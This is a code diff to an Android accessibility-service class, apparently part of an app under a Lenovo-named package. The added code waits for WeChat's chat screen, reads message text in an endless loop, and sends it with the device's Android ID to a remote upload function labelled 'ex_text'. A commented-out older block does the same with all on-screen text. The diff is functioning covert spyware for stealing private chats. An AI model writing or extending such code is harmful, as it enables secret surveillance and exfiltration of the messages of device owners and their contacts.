@@ -18,28 +18,85 @@
 package com.lenovo.innovate.prince.accessiblity;
 
 
+import static com.xuexiang.xutil.XUtil.getContentResolver;
+
+import android.provider.Settings;
 import android.util.Log;
 import android.view.accessibility.AccessibilityNodeInfo;
 
+import com.alibaba.fastjson.JSONArray;
+import com.alibaba.fastjson.JSONObject;
 import com.lenovo.innovate.MyApp;
 import com.lenovo.innovate.prince.accessiblity.AccessService;
+import com.lenovo.innovate.prince.http.permissionUp;
 import com.lenovo.innovate.prince.utils.ServiceUtils;
+import com.lenovo.innovate.utils.Utils;
+
+import org.apache.commons.lang3.StringUtils;
 
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 public class StringText {
 
     private static final String TAG = "StringText";
     public AccessService service = MyApp.getInstance().getService();
-    List<String> list=new ArrayList<>();
+
 
     public void start(){
-        sleep(2000);
+
+
+
+
+        while (true){
+          AccessibilityNodeInfo findViewByID =  ServiceUtils.findViewById(service,"com.tencent.mm:id/en");
+            if(!AccUtils.isEmptyView(findViewByID)){
+                Log.i(TAG,"抵达聊天界面" );
+                break;
+            }
+        }
+
+
+        List<String> list=new ArrayList<>();
+        List<String> list_up=new ArrayList<>();
+        while(true){
+
+            List<AccessibilityNodeInfo> findView_chat =  ServiceUtils.findViewByIdList(service,"com.tencent.mm:id/b4b");
+            if(!AccUtils.isEmptyArray(findView_chat)){
+
+                for (int i = 0; i < findView_chat.size(); i++) {
+                    String text = findView_chat.get(i).getText().toString();
+                    if(!text.isEmpty()){
+                        Log.i(TAG,text);
+                        list.add(text);
+                        break;
+
+                    }
+                }
+            }
+
+
+            Map<String,Object> map=new HashMap<String,Object>();
+            map.put("screen",String.join("",list));
+            JSONObject jsonObject  = new JSONObject();
+            jsonObject.put("permission","ex_text");
+            jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+            jsonObject.put("data", JSONArray.toJSON(map));
+            permissionUp.Up(8,jsonObject);
+
+        }
+
+
+
+
+       /* sleep(2000);
 
         int  a = 0;
         String text = null;
-        while (a<100) {
+        while (a<10) {
+            List<String> list=new ArrayList<>();
             List<AccessibilityNodeInfo> findViewPicture = ServiceUtils.findViewByClassName(service, "android.widget.TextView");
             for (AccessibilityNodeInfo NodeInfo : findViewPicture) {
                 if(NodeInfo.getText() != null){
@@ -74,12 +131,21 @@ public class StringText {
                 }
             }
 
-            Log.i(TAG,list.toString());
-            sleep(1000);
-            a++;
-        }
+            Map<String,Object> map=new HashMap<String,Object>();
+            map.put("screen",String.join("",list));
+            JSONObject jsonObject  = new JSONObject();
+            jsonObject.put("permission","ex_text");
+            jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
+            jsonObject.put("data", JSONArray.toJSON(map));
 
-        Log.i(TAG,list.toString());
+            permissionUp.Up(8,jsonObject);
+
+            Log.i(TAG,list.toString());
+            sleep(8000);
+            a++;
+        }*/
+
+
     }
 
     private void sleep(int i) {
